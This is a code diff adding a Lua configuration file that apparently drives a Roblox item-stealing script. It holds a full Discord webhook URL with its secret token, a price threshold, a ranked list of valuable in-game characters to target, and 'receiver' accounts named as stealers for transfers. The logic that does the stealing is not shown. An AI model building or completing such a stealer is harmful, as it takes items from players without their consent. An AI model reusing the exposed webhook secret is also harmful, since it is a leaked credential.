@@ -1,0 +1,40 @@
+local config = {}
+
+config.PRICE_LIMIT = 10_000_000
+config.WEBHOOK = "https://discord.com/api/webhooks/1429682287297036298/mweMfFnid0qzppGpcbz06_pVKt2KfAzPVf7KnoFnoL_KECRC74QE4QDsNg9DIeoP37T2"
+
+config.targetNames = {
+    {name = "Strawberry Elephant", priority = 1},
+    {name = "Meowl", priority = 2},
+    {name = "Dragon Cannelloni", priority = 3},
+    {name = "Spooky and Pumky", priority = 4},
+    {name = "Spaghetti Tualetti", priority = 5},
+    {name = "La Secret Combinasion", priority = 6},
+    {name = "La Supreme Combinasion", priority = 7},
+    {name = "Ketupat Kepat", priority = 8},
+    {name = "Garama and Madundung", priority = 9},
+    {name = "Ketchuru and Musturu", priority = 10},
+    {name = "Los Lucky Blocks", priority = 11},
+    {name = "Los Hotspotsitos", priority = 12},
+    {name = "Los Bros", priority = 13},
+    {name = "Los Nooo My Hotspotsitos", priority = 14},
+    {name = "Nooo My Hotspot", priority = 15},
+    {name = "Nuclearo Dinossauro", priority = 16},
+    {name = "La Grande Combinasion", priority = 17},
+    {name = "La Spooky Grande", priority = 18},
+    {name = "Los Combinasionas", priority = 19},
+    {name = "Tacorita Bicicleta", priority = 20},
+    {name = "Esok Sekolah", priority = 21},
+    {name = "Secret Lucky Block", priority = 22},
+    {name = "Admin Lucky Block", priority = 23},
+    {name = "Taco Lucky Block", priority = 24},
+    {name = "67", priority = 25},
+}
+
+-- Display names for filtering or tagging
+config.Displayname = { "yorushika", "gagst34l3r" }
+
+-- Receivers for notifications or transfers
+config.Receiver = { "gagst34l3r", "13sabst34l3r" }
+
+return config
